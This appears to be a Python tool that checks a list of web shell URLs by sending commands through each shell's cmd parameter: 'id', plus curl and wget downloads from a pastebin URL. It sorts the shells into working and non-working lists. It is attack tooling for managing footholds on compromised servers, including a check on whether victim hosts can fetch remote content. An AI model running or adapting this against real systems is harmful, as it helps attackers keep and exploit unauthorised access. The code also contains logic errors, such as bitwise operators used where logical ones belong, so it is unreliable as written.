import argparse
import sys

import requests
import csv

ascii_purple_color = "\x1b[38;5;13m"
ascii_green_color = "\x1b[32m"
ascii_red_color = "\x1b[1;31m"
reset_ascii_color = "\u001B[0m"


def parse_arguments():
    parser = argparse.ArgumentParser(description="Checks shell status")
    parser.add_argument('-l', help='Path to list with web shells', required=True)
    parser.format_help()
    args = parser.parse_args()
    if len(sys.argv) == 0 or args.l == '' or args is None:
        parser.print_help()
        sys.exit(1)
    else:
        check_status(args.l)


def check_status(path):
    cmd_id = "id"
    cmd_curl = "curl https://pastebin.com/raw/NYE0HT2k"
    # this command checks could file be downloaded and redirects output to stdout without saving it
    cmd_wget = "wget https://pastebin.com/raw/NYE0HT2k --output-document - | head -n1"
    secret_message = "$2a$15$WNSlyUYj7TlpIXo.QAo/y.MTsitEwhm00gIIgHTJuc.GANQW9tgSC"
    file_with_working_shells = "working.txt"
    file_with_not_working_shells = "not_working.txt"
    with (open(path) as file):
        with open(file_with_working_shells, 'w') as working_shells_file:
            with open(file_with_not_working_shells, 'w') as not_working_shells_file:
                for line in file:
                    response_text_id = requests.get(line + f"?cmd={cmd_id}").text
                    response_text_curl = requests.get(line + f"?cmd={cmd_curl}").text
                    response_text_wget = requests.get(line + f"?cmd={cmd_wget}").text

                    contains_uid = response_text_id.find("uid")
                    contains_wget_file = secret_message in response_text_wget
                    contains_curl_file = secret_message in response_text_curl
                    if contains_uid != -1 & contains_curl_file & contains_wget_file:

                        response_status = requests.get(line + "?cmd=id").status_code
                        print(ascii_green_color + "Shell " + line + " is alive." + "\n" +
                              "Status code: " + str(response_status))
                        print("All necessary commands works." + reset_ascii_color)

                        working_shells_file.write(line + "\n")
                    elif contains_uid != -1 | contains_curl_file | contains_wget_file:
                        print(ascii_red_color + "Probably not all commands working" + reset_ascii_color)
                        not_working_shells_file.write(line + "\n")
                    else:
                        print("Shell did not respond: " + line + "\n" +
                              "Check path to shell ")
                        not_working_shells_file.write(line + "\n")
    file.close()
    not_working_shells_file.close()
    working_shells_file.close()


def print_banner():
    print(ascii_purple_color)
    print(' .---------------------------------------------------------------.' + "\n"
          ' |      O                                                        |' + "\n"
          ' |      |                                                        |' + "\n"               
          ' |0{XXXX}+===================================================>   |' + "\n"  
          ' |      |                                                        |' + "\n"
          ' |      O                                                        |' + "\n"                                                                     
          ' |---------------------------------------------------------------|' + "\n"                                                                     
          ' | __        _______ ____    ____  _   _ _____ _     _     ____  |' + "\n"
          ' | \\ \\      / / ____| __ )  / ___|| | | | ____| |   | |   / ___| |' + "\n"
          ' |  \\ \\ /\\ / /|  _| |  _ \\  \\___ \\| |_| |  _| | |   | |   \\___ \\ |' + "\n"
          ' |   \\ V  V / | |___| |_) |  ___) |  _  | |___| |___| |___ ___) ||' + "\n"
          ' |   _\\_/\\_/  |_____|____/ _|____/|_| |_|_____|_____|_____|____/ |' + "\n"
          ' |  / ___| | | | ____/ ___| |/ / ____|  _ \\                      |' + "\n"
          " | | |   | |_| |  _|| |   | ' /|  _| | |_) |                     |" + "\n"
          ' | | |___|  _  | |__| |___| . \\| |___|  _ <                      |' + "\n"
          ' |  \\____|_| |_|_____\\____|_|\\_\\_____|_| \\_\\                     |' + "\n"
          ' |                                                               |' + "\n"
          " '---------------------------------------------------------------'")
    print(reset_ascii_color)


if __name__ == '__main__':
    print_banner()
    parse_arguments()
